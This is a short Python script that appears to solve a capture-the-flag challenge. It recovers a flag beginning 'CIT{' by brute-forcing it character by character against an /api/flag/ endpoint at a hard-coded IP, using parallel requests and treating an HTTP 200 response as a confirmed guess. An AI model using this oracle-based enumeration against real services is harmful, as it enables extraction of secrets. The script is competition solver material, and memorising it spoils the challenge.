#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "requests>=2.32.0",
# ]
# ///

import concurrent.futures
import string
import sys

import requests


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def probe(base_url: str, guess: str) -> int:
    session = requests.Session()
    session.trust_env = False
    response = session.get(f"{base_url}/api/flag/", params={"guess": guess}, timeout=10)
    return response.status_code


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5559"
    base_url = base_url.rstrip("/")

    charset = string.ascii_letters + string.digits + string.punctuation
    prefix = "CIT{"
    target_len = 32

    while len(prefix) < target_len:
        found = None
        with concurrent.futures.ThreadPoolExecutor(max_workers=24) as executor:
            futures = {
                executor.submit(probe, base_url, prefix + candidate): candidate
                for candidate in charset
            }
            for future in concurrent.futures.as_completed(futures):
                candidate = futures[future]
                status = future.result()
                if status == 200:
                    found = candidate
                    break

        if found is None:
            fail(f"could not extend prefix: {prefix}")

        prefix += found

    print(prefix)


if __name__ == "__main__":
    main()
